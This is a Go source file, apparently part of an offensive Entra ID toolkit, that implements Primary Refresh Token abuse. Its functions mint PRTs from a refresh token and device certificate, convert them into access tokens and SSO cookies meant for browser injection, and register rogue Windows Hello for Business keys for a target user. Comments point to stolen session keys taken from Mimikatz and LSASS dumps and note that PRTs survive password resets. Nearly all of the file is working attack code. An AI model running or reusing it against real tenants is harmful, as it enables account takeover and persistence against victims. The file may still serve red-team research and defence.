// Package prt implements Entra ID Primary Refresh Token (PRT) operations.
// PRTs are device-bound tokens that can mint access tokens for any resource
// and survive password resets when bound to a device certificate.
package prt

import (
	"bytes"
	"context"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/bl4cksku11/entraith/internal/modules/devicereg"
	"github.com/google/uuid"
)

const (
	aadTokenEndpoint = "https://login.microsoftonline.com/common/oauth2/token"
	prtBearerGrant   = "urn:ietf:params:oauth:grant-type:jwt-bearer"
	winHelloEndpoint = "https://enterpriseregistration.windows.net/EnrollmentServer/key/?api-version=1.0"
)

// httpClient carries a timeout so a stalled connection to the Microsoft
// identity endpoints cannot hang the calling handler goroutine indefinitely.
var httpClient = &http.Client{Timeout: 30 * time.Second}

// PRT holds a Primary Refresh Token and its associated session key.
type PRT struct {
	ID           string    `json:"id"`
	Label        string    `json:"label"`
	DeviceCertID string    `json:"device_cert_id"`
	Token        string    `json:"prt_token"`
	SessionKey   string    `json:"session_key"`
	TargetUPN    string    `json:"target_upn"`
	TenantID     string    `json:"tenant_id"`
	CreatedAt    time.Time `json:"created_at"`
}

// WinHelloKey holds a registered Windows Hello for Business NGC key.
type WinHelloKey struct {
	ID            string    `json:"id"`
	Label         string    `json:"label"`
	DeviceCertID  string    `json:"device_cert_id"`
	KeyID         string    `json:"key_id"`
	PrivateKeyPEM string    `json:"private_key"`
	TargetUPN     string    `json:"target_upn"`
	CreatedAt     time.Time `json:"created_at"`
}

// ─── JWT helpers ──────────────────────────────────────────────────────────────

func b64url(data []byte) string {
	return base64.RawURLEncoding.EncodeToString(data)
}

func buildUnsigned(header, payload map[string]interface{}) (string, error) {
	hb, err := json.Marshal(header)
	if err != nil {
		return "", err
	}
	pb, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}
	return b64url(hb) + "." + b64url(pb), nil
}

func signRS256JWT(header, payload map[string]interface{}, privKey *rsa.PrivateKey) (string, error) {
	unsigned, err := buildUnsigned(header, payload)
	if err != nil {
		return "", err
	}
	h := sha256.New()
	h.Write([]byte(unsigned))
	sig, err := rsa.SignPKCS1v15(rand.Reader, privKey, crypto.SHA256, h.Sum(nil))
	if err != nil {
		return "", err
	}
	return unsigned + "." + b64url(sig), nil
}

func signHS256JWT(header, payload map[string]interface{}, key []byte) (string, error) {
	unsigned, err := buildUnsigned(header, payload)
	if err != nil {
		return "", err
	}
	mac := hmac.New(sha256.New, key)
	mac.Write([]byte(unsigned))
	return unsigned + "." + b64url(mac.Sum(nil)), nil
}

// ─── Session-key material decoding ───────────────────────────────────────────

// DecodeKeyMaterial decodes a session key / key blob supplied in any of the
// encodings the common PRT capture tools emit: standard base64 (roadtx and
// AADInternals JSON), base64url, or hex (Mimikatz `sekurlsa::cloudap`,
// AADInternals `-AsHex`, and most LSASS dumps). Surrounding quotes, whitespace
// and a leading 0x are stripped first.
//
// It returns an explicit error instead of silently yielding an empty key, so a
// wrong-encoding drop fails loudly at exchange time rather than deriving a
// garbage key and producing an opaque "invalid grant" from Microsoft. Hex is
// tried before base64 because a 64-char hex session key is also valid base64 —
// but only the hex reading (32 bytes, AES-256) is the real key.
func DecodeKeyMaterial(s string) ([]byte, error) {
	s = strings.TrimSpace(s)
	s = strings.Trim(s, `"'`)
	s = strings.TrimSpace(s)
	if s == "" {
		return nil, fmt.Errorf("empty key material")
	}
	h := strings.TrimPrefix(strings.TrimPrefix(s, "0x"), "0X")
	if len(h)%2 == 0 && isHex(h) {
		if b, err := hex.DecodeString(h); err == nil {
			return b, nil
		}
	}
	if strings.ContainsAny(s, "-_") {
		if b, err := base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "=")); err == nil {
			return b, nil
		}
	}
	if b, err := base64.StdEncoding.DecodeString(s); err == nil {
		return b, nil
	}
	if b, err := base64.RawStdEncoding.DecodeString(strings.TrimRight(s, "=")); err == nil {
		return b, nil
	}
	return nil, fmt.Errorf("key material is not valid hex or base64")
}

// isHex reports whether s is a non-empty run of hex digits.
func isHex(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

// ─── KBKDF SP800-108 counter mode ────────────────────────────────────────────

func deriveKey(sessionKey, context []byte) []byte {
	label := []byte("AzureAD-SecureConversation")
	mac := hmac.New(sha256.New, sessionKey)
	var ctr [4]byte
	binary.BigEndian.PutUint32(ctr[:], 1)
	mac.Write(ctr[:])
	mac.Write(label)
	mac.Write([]byte{0x00})
	mac.Write(context)
	var bits [4]byte
	binary.BigEndian.PutUint32(bits[:], 256)
	mac.Write(bits[:])
	return mac.Sum(nil)
}

// ─── JWE Decryption ──────────────────────────────────────────────────────────

func decryptJWE(compact string, privKey *rsa.PrivateKey) ([]byte, error) {
	parts := strings.Split(compact, ".")
	if len(parts) != 5 {
		return nil, fmt.Errorf("invalid JWE: want 5 parts, got %d", len(parts))
	}
	dec := func(s string) ([]byte, error) { return base64.RawURLEncoding.DecodeString(s) }

	headerBytes, _ := dec(parts[0])
	encKey, err := dec(parts[1])
	if err != nil {
		return nil, fmt.Errorf("JWE key: %w", err)
	}
	iv, err := dec(parts[2])
	if err != nil {
		return nil, fmt.Errorf("JWE iv: %w", err)
	}
	ct, err := dec(parts[3])
	if err != nil {
		return nil, fmt.Errorf("JWE ciphertext: %w", err)
	}
	tag, err := dec(parts[4])
	if err != nil {
		return nil, fmt.Errorf("JWE tag: %w", err)
	}

	var header struct {
		Enc string `json:"enc"`
	}
	json.Unmarshal(headerBytes, &header)

	cek, err := rsa.DecryptOAEP(sha1.New(), rand.Reader, privKey, encKey, nil)
	if err != nil {
		return nil, fmt.Errorf("RSA-OAEP: %w", err)
	}

	if strings.Contains(header.Enc, "GCM") {
		block, err := aes.NewCipher(cek)
		if err != nil {
			return nil, err
		}
		gcm, err := cipher.NewGCMWithNonceSize(block, len(iv))
		if err != nil {
			return nil, err
		}
		return gcm.Open(nil, iv, append(ct, tag...), []byte(parts[0]))
	}
	// CBC
	half := len(cek) / 2
	block, err := aes.NewCipher(cek[half:])
	if err != nil {
		return nil, err
	}
	plain := make([]byte, len(ct))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(plain, ct)
	if len(plain) == 0 {
		return nil, fmt.Errorf("empty plaintext")
	}
	pad := int(plain[len(plain)-1])
	if pad > aes.BlockSize || pad == 0 {
		return nil, fmt.Errorf("invalid padding")
	}
	return plain[:len(plain)-pad], nil
}

// ─── Server Nonce ─────────────────────────────────────────────────────────────

func getServerNonce(ctx context.Context) (string, error) {
	form := url.Values{}
	form.Set("grant_type", "srv_challenge")
	req, err := http.NewRequestWithContext(ctx, "POST", aadTokenEndpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("srv_challenge: %w", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var sc struct {
		Nonce string `json:"Nonce"`
	}
	json.Unmarshal(body, &sc)
	if sc.Nonce == "" {
		return "", fmt.Errorf("empty nonce: %s", string(body))
	}
	return sc.Nonce, nil
}

// ─── PRT Request ──────────────────────────────────────────────────────────────

// Request exchanges a refresh token + device certificate for a PRT.
func Request(ctx context.Context, refreshToken, clientID string, dc *devicereg.DeviceCert) (*PRT, error) {
	nonce, err := getServerNonce(ctx)
	if err != nil {
		return nil, fmt.Errorf("nonce: %w", err)
	}
	privKey, err := dc.PrivateKey()
	if err != nil {
		return nil, err
	}
	cert, err := dc.ParsedCert()
	if err != nil {
		return nil, err
	}

	now := time.Now().Unix()
	header := map[string]interface{}{
		"alg": "RS256",
		"typ": "JWT",
		"x5c": []string{base64.StdEncoding.EncodeToString(cert.Raw)},
	}
	payload := map[string]interface{}{
		"request_nonce": nonce,
		"scope":         "openid aza offline_access",
		"grant_type":    "refresh_token",
		"refresh_token": refreshToken,
		"win_ver":       "10.0.19041.0",
		"iat":           now,
		"exp":           now + 300,
		"jti":           uuid.New().String(),
	}
	signed, err := signRS256JWT(header, payload, privKey)
	if err != nil {
		return nil, err
	}

	form := url.Values{}
	form.Set("grant_type", prtBearerGrant)
	form.Set("request", signed)
	form.Set("client_id", clientID)
	form.Set("windows_api_version", "2.2")

	req, err := http.NewRequestWithContext(ctx, "POST", aadTokenEndpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		var te struct {
			Error            string `json:"error"`
			ErrorDescription string `json:"error_description"`
		}
		json.Unmarshal(body, &te)
		return nil, fmt.Errorf("PRT request: %s — %s", te.Error, te.ErrorDescription)
	}
	var prtResp struct {
		RefreshToken  string `json:"refresh_token"`
		SessionKeyJWE string `json:"session_key_jwe"`
	}
	if err := json.Unmarshal(body, &prtResp); err != nil {
		return nil, fmt.Errorf("parse PRT response: %w", err)
	}
	skBytes, err := decryptJWE(prtResp.SessionKeyJWE, privKey)
	if err != nil {
		return nil, fmt.Errorf("decrypt session key: %w", err)
	}
	return &PRT{
		ID:           uuid.New().String(),
		DeviceCertID: dc.ID,
		Token:        prtResp.RefreshToken,
		SessionKey:   base64.StdEncoding.EncodeToString(skBytes),
		CreatedAt:    time.Now().UTC(),
	}, nil
}

// ─── PRT → Access Token ───────────────────────────────────────────────────────

func ToAccessToken(ctx context.Context, p *PRT, clientID, resource, scope string) (json.RawMessage, error) {
	nonce, err := getServerNonce(ctx)
	if err != nil {
		return nil, err
	}
	skBytes, err := DecodeKeyMaterial(p.SessionKey)
	if err != nil {
		return nil, fmt.Errorf("session key: %w", err)
	}
	nonceCtx, err := base64.StdEncoding.DecodeString(nonce)
	if err != nil {
		nonceCtx = []byte(nonce)
	}
	dk := deriveKey(skBytes, nonceCtx)

	now := time.Now().Unix()
	header := map[string]interface{}{"alg": "HS256", "typ": "JWT", "ctx": nonce}
	payload := map[string]interface{}{
		"prt": p.Token, "iss": clientID, "aud": "login.microsoftonline.com",
		"iat": now, "exp": now + 300, "request_nonce": nonce, "scope": "openid aza",
	}
	signed, err := signHS256JWT(header, payload, dk)
	if err != nil {
		return nil, err
	}

	form := url.Values{}
	form.Set("grant_type", prtBearerGrant)
	form.Set("request", signed)
	form.Set("client_id", clientID)
	if resource != "" {
		form.Set("resource", resource)
	}
	if scope != "" {
		form.Set("scope", scope)
	}
	form.Set("windows_api_version", "2.2")

	req, err := http.NewRequestWithContext(ctx, "POST", aadTokenEndpoint, strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("access token: %s", string(body))
	}
	return body, nil
}

// ToCookie generates a PRT SSO cookie for browser injection.
func ToCookie(ctx context.Context, p *PRT) (string, error) {
	nonce, err := getServerNonce(ctx)
	if err != nil {
		return "", err
	}
	skBytes, err := DecodeKeyMaterial(p.SessionKey)
	if err != nil {
		return "", fmt.Errorf("session key: %w", err)
	}
	nonceCtx, err := base64.StdEncoding.DecodeString(nonce)
	if err != nil {
		nonceCtx = []byte(nonce)
	}
	dk := deriveKey(skBytes, nonceCtx)
	now := time.Now().Unix()
	header := map[string]interface{}{"alg": "HS256", "typ": "JWT", "ctx": nonce}
	payload := map[string]interface{}{
		"prt": p.Token, "iss": "aad:brokerplugin",
		"iat": now, "exp": now + 300, "request_nonce": nonce,
	}
	return signHS256JWT(header, payload, dk)
}

// ─── WinHello ─────────────────────────────────────────────────────────────────

// RegisterWinHello registers a Windows Hello for Business NGC key.
func RegisterWinHello(ctx context.Context, accessToken string, dc *devicereg.DeviceCert, userID, label string) (*WinHelloKey, error) {
	whKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("keygen: %w", err)
	}
	keyID := uuid.New().String()
	pub := &whKey.PublicKey
	keyMaterial, _ := json.Marshal(map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(pub.N.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes()),
	})

	body, _ := json.Marshal(map[string]interface{}{
		"kngc": map[string]interface{}{
			"KeyId": keyID, "KeyMaterial": base64.StdEncoding.EncodeToString(keyMaterial),
			"KeyUsage": "NGC", "DeviceId": dc.DeviceID, "UserId": userID,
		},
	})

	req, err := http.NewRequestWithContext(ctx, "POST", winHelloEndpoint, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)
	req.Header.Set("Content-Type", "application/json")
	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	rb, _ := io.ReadAll(resp.Body)
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("WinHello %d: %s", resp.StatusCode, string(rb))
	}

	keyPEM := string(pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(whKey),
	}))

	return &WinHelloKey{
		ID: uuid.New().String(), Label: label, DeviceCertID: dc.ID,
		KeyID: keyID, PrivateKeyPEM: keyPEM, TargetUPN: userID,
		CreatedAt: time.Now().UTC(),
	}, nil
}
